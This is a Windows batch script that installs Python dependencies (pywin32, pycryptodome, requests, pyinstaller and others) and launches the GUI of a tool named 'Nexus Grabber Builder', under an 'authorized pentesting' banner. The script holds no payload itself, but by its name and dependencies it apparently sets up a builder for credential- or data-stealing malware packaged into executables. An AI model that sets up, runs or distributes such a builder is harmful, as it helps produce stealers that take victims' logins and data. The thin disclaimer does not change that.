@echo off
title Nexus Grabber Builder - Authorized Pentesting
echo ============================================
echo  Nexus Grabber Builder Setup
echo  FOR AUTHORIZED SECURITY TESTING ONLY
echo ============================================
echo.

python --version >nul 2>&1
if %errorlevel% neq 0 (
    echo [!] Python is not installed or not in PATH.
    echo [!] Please install Python 3.8+ from https://www.python.org/downloads/
    pause
    exit /b 1
)

echo [*] Python detected. Installing dependencies...
echo.

pip install customtkinter pillow pywin32 psutil pycryptodome requests pyinstaller
if %errorlevel% neq 0 (
    echo [!] Failed to install dependencies. Try running as Administrator.
    pause
    exit /b 1
)

echo [*] Dependencies installed successfully.
echo.

if exist "builder_gui.py" (
    python builder_gui.py
) else (
    echo [!] builder_gui.py not found!
    pause
    exit /b 1
)
